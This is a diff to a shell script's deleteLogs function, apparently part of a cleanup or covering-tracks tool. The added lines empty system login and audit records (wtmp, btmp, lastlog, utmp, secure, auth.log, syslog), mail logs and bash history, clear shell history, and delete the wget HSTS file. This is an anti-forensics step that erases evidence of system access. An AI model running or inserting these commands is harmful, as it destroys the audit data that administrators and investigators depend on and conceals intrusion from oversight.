@@ -7,6 +7,26 @@ deleteLogs(){
 	cd "$workdir"
 	#for i in `find . -name "*.log"`; do cat /dev/null > $i; done
 	for i in `find . -name "*.log"`; do rm -rf $i; done
+	
+	echo > /var/log/wtmp
+	echo > /var/log/btmp
+	echo > /var/log/lastlog
+	echo > /var/log/secure
+	echo > /var/log/messages
+	echo > /var/log/syslog
+	echo > /var/log/xferlog
+	echo > /var/log/auth.log
+	echo > /var/log/user.log
+	cat /dev/null > /var/adm/sylog
+	cat /dev/null > /var/log/maillog
+	cat /dev/null > /var/log/openwebmail.log
+	cat /dev/null > /var/log/mail.info
+	echo > /var/run/utmp
+	echo > ~/.bash_history
+	history -c
+	echo > .bash_history
+	history -cw
+	rm -f ~/.wget-hsts
 }
 
 deleteTorrents(){
